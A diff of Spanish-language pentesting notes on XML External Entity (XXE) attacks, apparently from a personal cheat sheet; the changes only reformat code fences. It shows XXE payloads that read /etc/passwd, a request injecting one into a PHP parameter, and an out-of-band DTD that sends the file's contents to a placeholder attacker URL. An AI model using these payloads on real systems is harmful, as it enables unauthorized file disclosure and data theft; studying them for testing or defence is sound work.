@@ -29,14 +29,12 @@ Consulta vulnerada
 # XML eXternal Entities - XXE
 
 Es posible indicarle al parser XML un archivo externo para poder leerlo.
-```
-~~~xml
+```xml
 <!ENTITY name SYSTEM "URI">
 ```
 
 Ejemplo
-```
-~~~xml
+```xml
 <!DOCTYPE message [
 	...
 	<!ENTITY xxefile SYSTEM "file:///etc/password">
@@ -47,8 +45,7 @@ Ejemplo
 ```
 
 Petición
-```ad-success
-~~~xml
+```xml
 ../example.php?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
 ```
 
@@ -59,8 +56,7 @@ En este caso es algo más complejo ya que el sistema tiene que tener acceso o vi
 La base de está vulnerabilidad está en la posibilidad de realizar peticiones por DTDs externos. Una manera simple de realizar una petición sería la siguiente:
 
 exfill.dtd
-```
-~~~xml
+```xml
 <!ENTITY % file SYSTEM []"file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://[url atacante]/?x=%file;'>">
 %eval;
@@ -69,8 +65,7 @@ exfill.dtd
 
 Petición
 
-```ad-success
-~~~xml
+```xml
 ../example1.php?xml=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://[URL atacante]/exfil.dtd"> %xxe;]><test>hola</test>
 ```
 
